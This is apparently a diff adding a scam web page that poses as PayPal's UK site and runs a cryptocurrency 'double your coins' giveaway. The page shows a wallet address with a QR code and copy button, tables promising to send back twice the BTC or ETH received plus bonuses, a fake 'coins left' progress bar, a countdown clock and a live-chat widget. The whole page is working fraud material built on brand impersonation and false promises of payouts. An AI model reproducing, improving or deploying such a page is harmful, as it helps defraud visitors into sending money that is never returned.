+                                    <p class="editorial__paragraph notification-ribbon__headline" style="color: #00a8ea; margin-bottom: 20px;"><span id="trnsctin" class="yel2 cosh1" style="color: #29BEE8;"></span></p>
+                                </div>
+                                <div class="col-xs-12 col-md-12 editorial__container editorial__text">
+                                    <div class="qr">
+                                        <img class="qr_code" src="https://chart.apis.google.com/chart?cht=qr&amp;chs=230x230&amp;chld=L&amp;choe=UTF-8&amp;chl=11111" width="130" height="130">
+                                    </div>
+                                    <div class="buffer" style="display: inline-block;border-radius:4px;padding:8px 16px 4px 16px;">
+                                        <btn data-clipboard-text="11111" class="copy"><i class="far fa-copy"></i> Copy Address to Clipboard</btn>
+                                    </div>
+                                </div>
+                                <div class="col-xs-12 col-md-12 editorial__container editorial__text" style="margin-top: 40px;">
+                                    <h2 class="pypl-heading editorial__headline"> Instruction </h2>
+                                    <p class="editorial__paragraph notification-ribbon__headline"> - To make a transaction, you can use any wallet or exchange to participate!</p>
+                                    <p class="editorial__paragraph notification-ribbon__headline"> - One-time use only, once we receive your transaction, we will immediately send the requested amount back to you.</p>
+                                    <br>
+                                    <div>
+                                        <table class="tabl_btc" style="display: none; margin: 0 auto; margin-bottom: 15px; margin-top: 20px; text-align: center; color: rgb(123, 133, 133) !important;">
+                                            <tbody>
+                                                <tr>
+                                                    <th>If you send 0.1 - 0.19 BTC you will be airdropped 0.2 - 0.38 BTC back.</th>
+                                                </tr>
+                                                <tr>
+                                                    <th>If you send 0.3 - 0.99 BTC you will be airdropped 0.6 - 1.98 BTC back +1% bonus.</th>
+                                                </tr>
+                                                <tr>
+                                                    <th>If you send 1 - 4.99 BTC you will be airdropped 2 - 9.98 BTC back +5% bonus.</th>
+                                                </tr>
+                                                <tr>
+                                                    <th>If you send 5 - 9.99 BTC you will be airdropped 10 - 19.98 BTC back +10% bonus.</th>
+                                                </tr>
+                                                <tr>
+                                                    <th>If you send 10 - 19.99 BTC you will be airdropped 20 - 39.98 BTC back +20% bonus.</th>
+                                                </tr>
+                                                <tr>
+                                                    <th>If you send 20 BTC you will be airdropped 40 BTC back +25% bonus.</th>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                        <table class=" tabl_eth" style="display: none; margin: 0 auto;margin-bottom: 15px;margin-top: 20px;text-align:center; color: #7B8585!important;display: none;">
+                                           <tr>
+                                              <th>If you send 3 - 5.99 ETH you will be airdropped 4 - 9.98 ETH back.</th>
+                                           </tr>
+                                           <tr>
+                                              <th>If you send 6 - 29.99 ETH you will be airdropped 12 - 29.98 ETH back +1% bonus.</th>
+                                           </tr>
+                                           <tr>
+                                              <th>If you send 30 - 99.99 ETH you will be airdropped 60 - 199.98 ETH back +5% bonus.</th>
+                                           </tr>
+                                           <tr>
+                                              <th>If you send 100 - 499.99 ETH you will be airdropped 200 - 999.98 ETH back +10% bonus.</th>
+                                           </tr>
+                                           <tr>
+                                              <th>If you send 500-999.99 ETH you will be airdropped 1000 - 1999.98 ETH back +20% bonus.</th>
+                                           </tr>
+                                           <tr>
+                                              <th>If you send 2000 ETH you will be airdropped 4000 ETH back +25% bonus.</th>
+                                           </tr>
+                                        </table>
+
+
+                                    </div>
+                                    <div class="wait" style="margin: 40px 0;color: #7B8585!important;"><i class="fas fa-spinner rotating"></i>Waiting for payment</div>
+                                    <p style="margin-bottom: 0px;">Once we receive your transaction, the outgoing transaction is processed to your address.</p>
+                                    <p style="margin-top: 0px; padding-top: 10px;">Every address that is sent too late, gets their <span class="type_wallet">ADA</span> immediately sent back.</p>
+                                </div>
+                            </div>
+
+<div id="lympo_progress">
+    <div class="row progress-row">
+        <div class="colums_12">
+            <div class="progress-ico">
+                <div class="progress-ico">
+                    <div class="progress" style="overflow: inherit;">
+                        <div class="progress-bar progress-bar-striped active progress-width" id="progress-ico" role="progressbar" style="width: 223.744px;">
+                            <span class="sr-only">x</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="dot-1" id="leftBTC" style="color: #7b8585 !important;">Counting <span class="type_wallet">BTC</span> left...</div>
+
+                <span class="progress-bar-value" id="progress-ico-bar">
+                    <div style="position: absolute; top: 0; width: 100%; height: 45px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 16px; font-weight: bold;">
+                        <span class="ostat">2 420</span> <span class="delim">/</span> <span class="max_vl">5 000</span>
+                    </div>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="last_trans">
+    <h1 class="f-24 mvn em-300">Transactions for Address:<span id="trnsctin"><!--?=$btc?--></span></h1>
+</div>
+
+<div class="container adasds">
+    <div class="row header-trans">
+        <div class="hash col-lg-3 col-md-3 col-sm-3 col-xs-3" style="text-align: left;">TxHash</div>
+        <div class="block-num col-lg-1 col-md-1 col-sm-1 col-xs-1">Block</div>
+        <div class="age col-lg-1 col-md-1 col-sm-1 col-xs-1">Age</div>
+        <div class="address-btc col-lg-2 col-md-2 col-sm-2 col-xs-2">From</div>
+        <div class="in-trans col-lg-1 col-md-1 col-sm-1 col-xs-1"></div>
+        <div class="address-btc-sec col-lg-2 col-md-2 col-sm-2 col-xs-2">To</div>
+        <div class="value-sum col-lg-1 col-md-1 col-sm-1 col-xs-1">Value</div>
+        <div class="tx-fee col-lg-1 col-md-1 col-sm-2 col-xs-2">TxFee</div>
+    </div>
+
+    <div class="trans-table">
+    </div>
+</div>
+
+                        </div>
+                    </section>
+                    <section class="editorial theme-background-color-white custom-editorial reverse-render" data-building-block="organism">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-xs-12 col-md-6 editorial__container editorial__text text-md-left">
+                                    <h2 class="pypl-heading editorial__headline">Send cash and a smile</h2>
+                                    <p class="editorial__paragraph">
+                                        You can now personalise any cash you send through the app, with illustrations and emojis. Or collect money for gifts with family or friends with a PayPal Money Pool*.<br />
+                                        <br />
+                                        <a href="#" class="editorial_link">Download the App</a>
+                                    </p>
+                                </div><div class="col-md-6 text-xs-center editorial__container editorial__device-image col-xs-12"><img class="editorial__image" src="images/Themes_WEB.png" alt="p2p theme"></div>
+                            </div>
+                        </div>
+                    </section>
+                    <section class="editorial theme-background-color-light custom-editorial" data-building-block="organism">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-md-6 text-xs-center editorial__container editorial__device-image col-xs-12"><img class="editorial__image" src="images/DONATE_WEBPAGE.png" alt="Yoga"></div><div class="col-xs-12 col-md-6 editorial__container editorial__text text-md-left">
+                                    <h2 class="pypl-heading editorial__headline">Donate to support charities</h2>
+                                    <p class="editorial__paragraph">
+                                        You can donate to special causes easily in the app and 100% of your donation will go to charity. No deductions, no fees. Or set your favourite charity in the app to easily donate £1 at checkout.<br />
+                                        <br />
+                                        <a href="#" class="editorial_link">Download the App</a>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section id="A6" class="editorial theme-background-color-white custom-editorial" data-building-block="organism">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-xs-12 col-md-6 editorial__container editorial__text text-md-left">
+                                    <h2 class="pypl-heading editorial__headline">Sleigh your shopping</h2>
+                                    <p class="editorial__paragraph">
+                                        Honey can find some of the best discounts at over 30,000 online stores to help you keep a little extra jingle in your pockets this Christmas.<br />
+                                        <br />
+                                        <a href="#" class="editorial_link">Join Honey</a>
+                                    </p>
+                                </div><div class="col-md-6 text-xs-center editorial__container editorial__device-image col-xs-12"><img class="editorial__image" src="images/COINY_Hill.png" alt="QR Code"></div>
+                            </div>
+                        </div>
+                    </section>
+                    <section id="module-three" class="showcase theme-background-color-light custom-logo-section" data-building-block="organism">
+                        <div class="container">
+                            <div class="row showcase__header">
+                                <h2 class="pypl-heading showcase__headline col-xs-12 col-md-10 center-block text-xs-center">Checkout with millions of brands you love</h2>
+                            </div>
+                            <hr />
+<div class="row showcase__container">
+   <div class="text-xs-center showcase__logo showcase__logo-0 col-xs-6 col-md-4"><img src="images/LOGOS_120x50_UK_NETFLIX.png"   class="showcase__image"></div>
+   <div class="text-xs-center showcase__logo showcase__logo-1 col-xs-6 col-md-4"><img src="images/LOGOS_120x50_SPOTIFY.png"  class="showcase__image"></div>
+   <div class="text-xs-center showcase__logo showcase__logo-2 col-xs-6 col-md-4"><img src="images/LOGOS_120x50_UK_NIKE.png" class="showcase__image"></div>
+   <div class="text-xs-center showcase__logo showcase__logo-3 col-xs-6 col-md-4"><img src="images/LOGOS_120x50_UK_ARGOS.png"  class="showcase__image"></div>
+   <div class="text-xs-center showcase__logo showcase__logo-4 col-xs-6 col-md-4"><img src="images/LOGOS_120x50_UK_BOOTS.png"  class="showcase__image"></div>
+   <div class="text-xs-center showcase__logo showcase__logo-5 col-xs-6 col-md-4"><img src="images/Next.png"   class="showcase__image"></div>
+</div>
+
+
+                        </div>
+                    </section>
+                    <section id="covid-statement" class="statement text-xs-center theme-background-color-white covid-banner" data-building-block="organism">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-md-10 col-md-offset-1">
+                                    <p class="statement__paragraph pp-sans-big-light">
+                                        <span class="covid-new">
+                                            <img class="covid-logo" src="images/covid-icon.png" />
+                                             Learn how we're <a href="#">responding to COVID-19</a> and how we can <a href="#">help your business adapt</a>. 
+                                        </span>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <section class="pullout custom-pullout theme-background-color-white" data-building-block="organism">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-xs-12 col-lg-10 center-block text-xs-center">
+                                    <h2 class="pypl-heading pullout__headline">
+                                        <b>
+                                            Join the millions of users worldwide<br />
+                                            trusting PayPal every day
+                                        </b>
+                                    </h2>
+                                    <a href="#" class="pypl-btn mpp-btn pullout__btn pullout__btn--center pypl-btn--blue">Sign Up for Free</a>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                    <div class="clock">
+                        <div class="second">
+                            <div class="number"><span>3</span></div>
+                        </div>
+                        <div class="second">
+                            <div class="number"><span>4</span></div>
+                        </div>
+                        <div class="second">
+                            <div class="number"><span>6</span></div>
+                        </div>
+                        <div class="second">
+                            <div class="number"><span>0</span></div>
+                        </div>
+                        <div class="second">
+                            <div class="number"><span>0</span></div>
+                        </div>
+                        <div class="second">
+                            <div class="number"><span>0</span></div>
+                        </div>
+                        <div class="second">
+                            <div class="number"><span>0</span></div>
+                        </div>
+                        <div class="second">
+                            <div class="number"><span>1</span></div>
+                        </div>
+                        <div class="second lastdigit">
+                            <div class="number"><span class="move">1</span><span class="move">2</span></div>
+                        </div>
+                    </div>
+                    <section class="disclosure theme-background-color-white" data-building-block="organism" id="A6">
+                        <div class="container">
+                            <div class="row">
+                                <div class="col-md-12 center-block">
+                                    <div><sup>*</sup> Paying friends back and chipping in requires an account with PayPal. The recipient will need to create an account with PayPal if they don't already have one.</div>
+                                </div>
+                            </div>
+                        </div>
+                    </section>
+                </div>
+<footer data-building-block="organism" class="global-footer" id="footer">
+   <div class="container">
+      <div class="row">
+         <div class="col-md-12">
+            <ul class="footer-main">
+               <li class="country-selector"><a href="https://www.paypal.com/uk/webapps/mpp/country-worldwide" aria-label="Change Language or Country/Region"  class="country lazy-load-flag GB"  style="background-image: url(&quot;https://www.paypalobjects.com/webstatic/mktg/icons/sprite_countries_flag4.png&quot;);">Change Language or Country/Region</a></li>
+            </ul>
+            <ul class="footer-main">
+               <li><a href="https://www.paypal.com/uk/smarthelp/home"  >Help</a></li>
+               <li><a href="https://www.paypal.com/uk/smarthelp/contact-us"  >Contact</a></li>
+               <li><a href="https://www.paypal.com/uk/webapps/mpp/paypal-fees"  >Fees</a></li>
+               <li><a href="https://www.paypal.com/uk/webapps/mpp/paypal-safety-and-security"  >Security</a></li>
+               <li><a href="https://app.adjust.com/bfpiqs_meciev?fallback=https%3A%2F%2Fwww%2Epaypal%2Ecom%2Fuk%2Fwebapps%2Fmpp%2Fmobile%2Dapps"  >Apps</a></li>
+               <li><a href="https://www.paypal.com/uk/shopping"  >Shop</a></li>
+               <li><a href="https://www.paypal.com/uk/brc/"  >Business Resource Centre</a></li>
+            </ul>
+         </div>
+      </div>
+      <div class="row">
+         <div class="col-md-12">
+            <hr class="hidden-lg-down">
+         </div>
+      </div>
+      <div class="row">
+         <div class="col-md-12">
+            <ul class="footer-secondary footer-corplinks">
+               <li><a href="https://www.paypal.com/uk/webapps/mpp/about"  >About</a></li>
+               <li><a href="https://www.paypal.com/stories/uk"  >Blog</a></li>
+               <li><a href="https://www.paypal.com/uk/webapps/mpp/jobs"  >Jobs</a></li>
+               <li><a href="https://www.paypal.com/uk/webapps/mpp/full-sitemap"  >Sitemap</a></li>
+               <li><a href="https://developer.paypal.com/"  >Developers</a></li>
+               <li><a href="https://www.paypal.com/uk/webapps/mpp/partner-programme"  >Partners</a></li>
+               <li><a href="https://www.paypal.com/uk/webapps/mpp/ua/legalhub-full"  >Modern Slavery Statement</a></li>
+            </ul>
+            <ul class="footer-tertiary copyright-section">
+               <li class="footer-copyright">© 1999–2020 </li>
+               <li><a href="https://www.paypal.com/uk/webapps/mpp/ua/privacy-full"  >Privacy</a></li>
+               <li><a href="https://www.paypal.com/uk/webapps/mpp/ua/legalhub-full"  >Legal</a></li>
+               <li><a href="https://www.paypal.com/uk/smarthelp/complaints"  >Complaints</a></li>
+            </ul>
+         </div>
+      </div>
+      <div class="row">
+         <div class="col-md-12">
+            <p class="footer-notes"></p>
+         </div>
+      </div>
+   </div>
+</footer>
+
+
+                <div>
+                    <style nonce="">
+                        @font-face {
+                            font-family: "PayPalSansSmall-Regular";
+                            font-style: normal;
+                            font-display: swap;
+                            src: url("../fonts/PayPalSansSmall-Regular.woff2") format("woff2"), url("../fonts/PayPalSansSmall-Regular.woff") format("woff"), url("../fonts/PayPalSansSmall-Regular.eot?#iefix") format("embedded-opentype"),
+                                url("../fonts/PayPalSansSmall-Regular.svg") format("svg");
+                        }
+                        #gdprCookieBanner {
+                            font-family: PayPalSansSmall-Regular, sans-serif;
+                        }
+                        @keyframes slideInFromBottom {
+                            0% {
+                                transform: translateY(100%);
+                                opacity: 0;
+                            }
+                            100% {
+                                transform: translateY(0);
+                                opacity: 1;
+                            }
+                        }
+                        .gdprCookieBanner_container {
+                            animation: 1s ease-in 0s 1 slideInFromBottom;
+                            width: 100%;
+                            bottom: 0;
+                            position: fixed;
+                            background-color: #012169;
+                            z-index: 1051;
+                            color: white;
+                            text-shadow: none;
+                        }
+                        .gdprCookieBanner_wrapper {
+                            max-width: 1024px;
+                            margin: 0 auto;
+                            padding: 0px;
+                            color: white;
+                        }
+                        #gdprCookieContent_wrapper {
+                            padding: 24px;
+                            display: flex;
+                        }
+                        #gdprCookieContent_wrapper a {
+                            font-weight: 700;
+                        }
+                        .gdprCookieBanner_content {
+                            max-width: 545px;
+                            font-weight: 400;
+                            font-size: 15px;
+                            line-height: 24px;
+                            margin: 0 48px 0 0;
+                            color: white;
+                        }
+                        .gdprCookieBanner_content a {
+                            font-size: inherit;
+                            color: white;
+                            text-decoration: underline;
+                        }
+                        .gdprCookieBanner_content a:focus {
+                            border: 1px solid rgba(256, 256, 256, 0.5);
+                        }
+                        .gdprCookieBanner_buttonGroup {
+                            display: flex;
+                            flex-direction: row;
+                            justify-content: flex-end;
+                            flex-shrink: 0;
+                        }
+                        .gdprCookieBanner_buttonGroup button {
+                            color: white;
+                            font-size: 13px;
+                        }
+                        .gdprCookieBanner_buttonGroup .gdpr_btn_reversed {
+                            color: #0070ba;
+                        }
+                        #declineAllButton {
+                            cursor: pointer;
+                            margin-right: 30px;
+                        }
+                        .gdprCookieBanner_buttonWrapper {
+                            display: flex;
+                            justify-content: center;
+                            flex-direction: column;
+                            text-align: center;
+                        }
+                        button.gdpr_btn {
+                            display: inline-block;
+                            padding: 6px 24px;
+                            color: #0070ba;
+                            border-radius: 18px;
+                            font-size: 13px;
+                            line-height: 1.6;
+                            text-align: center;
+                            text-decoration: none;
+                            cursor: pointer;
+                            transition: all 250ms ease;
+                            -webkit-font-smoothing: antialiased;
+                        }
+                        button.gdpr_btn_reversed {
+                            border-color: transparent;
+                            background-color: #ffffff;
+                            color: #0070ba;
+                        }
+                        .col-sm-12 {
+                            position: relative;
+                            min-height: 1px;
+                            padding-left: 15px;
+                            padding-right: 15px;
+                        }
+                        .gdprCookieBanner_acceptButton_arrow {
+                            display: none;
+                        }
+                        .gdprCookieBanner-acceptedAll {
+                            height: auto;
+                            margin-bottom: 12em;
+                        }
+                        @media only screen and (max-device-width: 1024px) {
+                            .gdprCookieBanner_content {
+                                font-size: 13px;
+                                color: white;
+                            }
+                        }
+                        @media (max-width: 768px) {
+                            .gdprCookieBanner_buttonGroup button {
+                                font-size: 15px;
+                            }
+                            #gdprCookieContent_wrapper {
+                                padding: 19px 24px;
+                                flex-direction: column;
+                            }
+                            .gdprCookieBanner_content {
+                                max-width: 100%;
+                                font-size: 13px;
+                                margin: 0;
+                                line-height: 18px;
+                            }
+                            .gdprCookieBanner_buttonWrapper {
+                                justify-content: flex-end;
+                                flex-direction: row;
+                            }
+                            .gdprCookieBanner_buttonWrapper button.gdpr_btn_reversed {
+                                background-color: transparent;
+                                border: none;
+                                color: white;
+                                padding: 0;
+                            }
+                            .gdprCookieBanner_acceptButton_arrow {
+                                margin-left: 5px;
+                                border: solid white;
+                                border-width: 0 2px 2px 0;
+                                display: inline-block;
+                                padding: 4px;
+                                transform: rotate(-45deg);
+                                -webkit-transform: rotate(-45deg);
+                            }
+                        }
+                        @media only screen and (max-width: 575.98px) {
+                            .gdprHideCookieBannerMobile {
+                                display: none;
+                            }
+                        }
+                    </style>
+                </div>
+            </div>
+        </div>
+        <script src="js/jquery-1.11.3.min.js"></script>
+        <script src="js/clipboard.js"></script>
+        <script src="js/main.js"></script>
+
+        <script>
+            var btns = document.querySelectorAll('btn');
+            var clipboard = new ClipboardJS(btns);
+            clipboard.on('success', function(e) {
+                console.log(e);
+            });
+            clipboard.on('error', function(e) {
+                console.log(e);
+            });
+        </script>
+        
+        <!-- Smartsupp Live Chat script -->
+<script type="text/javascript">
+var _smartsupp = _smartsupp || {};
+_smartsupp.key = '40196dc402b6c0343cf1f0627c83391479ba07c7';
+window.smartsupp||(function(d) {
+  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+  c.type='text/javascript';c.charset='utf-8';c.async=true;
+  c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+})(document);
+</script>
+    </body>
+</html>
